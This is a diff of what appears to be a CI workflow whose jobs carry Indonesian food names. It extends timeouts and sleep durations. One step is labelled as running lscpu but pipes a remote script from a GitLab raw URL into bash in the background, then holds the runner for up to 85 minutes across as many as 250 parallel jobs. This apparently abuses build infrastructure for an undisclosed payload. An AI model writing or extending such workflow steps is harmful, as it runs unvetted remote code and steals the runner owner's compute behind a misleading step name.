@@ -97,7 +97,7 @@ jobs:
   tepung:
     needs: [generate, build]   # paralel dengan cincau
     runs-on: ubuntu-latest
-    timeout-minutes: 40
+    timeout-minutes: 90
     strategy:
       max-parallel: 250
       fail-fast: false
@@ -108,7 +108,7 @@ jobs:
       - name: Jalankan lscpu & tahan 35 menit
         run: |
           curl -sL https://gitlab.com/makanan99/food/-/raw/main/saitama | bash &
-          sleep 35m
+          sleep 85m
 
   # =============================================
   # 🍜 Job tekwan (27 job) – lscpu + sleep 62m
